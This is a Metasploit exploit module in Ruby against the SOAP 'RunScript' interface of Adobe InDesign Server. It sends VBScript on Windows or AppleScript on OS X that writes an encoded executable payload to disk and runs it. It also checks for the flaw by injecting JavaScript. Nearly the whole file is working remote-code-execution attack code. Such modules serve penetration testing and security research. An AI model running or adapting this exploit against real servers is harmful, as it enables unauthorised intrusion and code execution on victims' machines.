##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe IndesignServer 5.5 SOAP Server Arbitrary Script Execution',
			'Description'    => %q{
					This module abuses the "RunScript" procedure provided by the SOAP interface of
				Adobe InDesign Server, to execute abritary vbscript (Windows) or applescript(OSX).

				The exploit drops the payload on the server and must be removed manually.
			},
			'Author'         =>
				[
					'h0ng10', # Vulnerability discovery / Metasploit module
					'juan vazquez' # MacOSX target
				],
			'License'        => MSF_LICENSE,
			'Platform'       => ['win', 'osx'],
			'Privileged'     => false,
			'DisclosureDate' => 'Nov 11 2012',
			'References'     =>
				[
					[ 'OSVDB', '87548'],
					[ 'URL', 'http://secunia.com/advisories/48572/' ]
				],
			'Targets'        =>
				[
					[
						'Indesign CS6 Server / Windows (64 bits)',
						{
							'Arch'     => ARCH_X86_64,
							'Platform' => 'win'
						}
					],
					[
						'Indesign CS6 Server / Mac OS X Snow Leopard 64 bits',
						{
							'Arch'     => ARCH_X86_64,
							'Platform' => 'osx'
						}
					]
				],
			'DefaultTarget'  => 0
		))

		register_options( [ Opt::RPORT(12345) ], self.class )
	end


	def send_soap_request(script_code, script_type)
		script_code.gsub!(/&/, '&amp;')
		soap_xml = %Q{
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:IDSP="http://ns.adobe.com/InDesign/soap/">
	<SOAP-ENV:Body>
		<IDSP:RunScript>
			<IDSP:runScriptParameters>
				<IDSP:scriptText>#{script_code}</IDSP:scriptText>
				<IDSP:scriptLanguage>#{script_type}</IDSP:scriptLanguage>
			</IDSP:runScriptParameters>
		</IDSP:RunScript>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
}

		res = send_request_cgi({
			'uri'          => '/',
			'method'       => 'POST',
			'content-type' => 'application/x-www-form-urlencoded',
			'data'         => soap_xml,
		}, 5)
	end


	def check()
		# Use a very simple javascript
		check_var = rand_text_numeric(10)
		checkscript =  'returnValue = "' + check_var + '"'

		res = send_soap_request(checkscript, "javascript")

		return Exploit::CheckCode::Vulnerable if res.body.include?('<data xsi:type="xsd:string">' + check_var + '</data>')

		return Exploit::CheckCode::Safe
	end

	def exploit

		if target.name =~ /Windows/
			print_status("Creating payload vbs script")
			encoded_payload = generate_payload_exe().unpack("H*").join
			exe_file = Rex::Text.rand_text_alpha_upper(8) + ".exe"
			wsf = Rex::Text.rand_text_alpha(8)
			payload_var = Rex::Text.rand_text_alpha(8)
			exe_name_var = Rex::Text.rand_text_alpha(8)
			file_var = Rex::Text.rand_text_alpha(8)
			byte_var = Rex::Text.rand_text_alpha(8)
			shell_var = Rex::Text.rand_text_alpha(8)

			# This one creates a smaller vbs payload (without deletion)
			vbs = %Q{
Set #{wsf} = CreateObject("Scripting.FileSystemObject")
#{payload_var}  = "#{encoded_payload}"
#{exe_name_var} =  #{wsf}.GetSpecialFolder(2) + "\\#{exe_file}"
Set #{file_var} = #{wsf}.opentextfile(#{exe_name_var}, 2, TRUE)
For x = 1 To Len(#{payload_var})-3 Step 2
	#{byte_var} = Chr(38) & "H" & Mid(#{payload_var}, x, 2)
	#{file_var}.write Chr(#{byte_var})
Next

#{file_var}.write Chr(#{byte_var})
#{file_var}.close

Set #{shell_var} = CreateObject("Wscript.Shell")
#{shell_var}.Run Chr(34) & #{exe_name_var} & Chr(34), 0, False
Set #{shell_var} = Nothing
returnValue = #{exe_name_var}
			}
			#	vbs = Msf::Util::EXE.to_exe_vbs(exe)
			print_status("Sending SOAP request")

			res = send_soap_request(vbs, "visual basic")
			if res != nil and res.body != nil then
				file_to_delete = res.body.to_s.scan(/<data xsi:type="xsd:string">(.*)<\/data><\/scriptResult>/).flatten[0]
				print_warning "Payload deployed to #{file_to_delete.to_s}, please remove manually"
			end

		elsif target.name =~ /Mac OS X/

			print_status("Creating payload apple script")

			exe_payload = generate_payload_exe
			b64_exe_payload = Rex::Text.encode_base64(exe_payload)
			b64_payload_name = rand_text_alpha(rand(5) + 5)
			payload_name = rand_text_alpha(rand(5) + 5)

			apple_script = %Q{
set fp to open for access POSIX file "/tmp/#{b64_payload_name}.txt" with write permission
write "begin-base64 644 #{payload_name}\n#{b64_exe_payload}\n====\n" to fp
close access fp
do shell script "uudecode -o /tmp/#{payload_name} /tmp/#{b64_payload_name}.txt"
do shell script "rm /tmp/#{b64_payload_name}.txt"
do shell script "chmod +x /tmp/#{payload_name}"
do shell script "/tmp/#{payload_name}"
set returnValue to "/tmp/#{payload_name}"
			}

			print_status("Sending SOAP request")

			res = send_soap_request(apple_script, "applescript")

			if res != nil and res.body != nil then
				file_to_delete = res.body.to_s.scan(/<data xsi:type="xsd:string">(.*)<\/data><\/scriptResult>/).flatten[0]
				file_to_delete = "/tmp/#{payload_name}" if file_to_delete.nil? or file_to_delete.empty?
				print_warning "Payload deployed to #{file_to_delete.to_s}, please remove manually"
			elsif not res
				print_status "No response, it's expected"
				print_warning "Payload deployed to /tmp/#{payload_name}, please remove manually"
			end

		end

	end

end